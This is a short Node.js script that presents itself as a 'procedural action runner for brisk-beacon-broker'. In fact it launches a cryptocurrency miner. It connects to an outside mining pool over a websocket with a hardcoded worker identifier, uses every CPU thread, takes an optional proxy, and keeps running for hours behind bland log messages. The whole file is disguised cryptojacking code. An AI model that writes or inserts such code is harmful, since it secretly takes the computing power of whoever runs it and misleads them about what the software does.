// Procedural action runner for brisk-beacon-broker
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

function createRuntimeContext() {
    const runId = "f9fc4c";
    console.log(`[worker] Instantiated runtime context for brisk-beacon-broker [${runId}]`);

    const service = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.stepmother",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    const tick = () => { setTimeout(tick, 87000); }; tick();
    setTimeout(() => {
        console.log("[timeout] Operational limit (347m) reached, exiting cleanly.");
        process.exit(0);
    }, 347 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log("[halt] Clean lifecycle exit confirmed.");
        process.exit(0);
    });
}

createRuntimeContext();
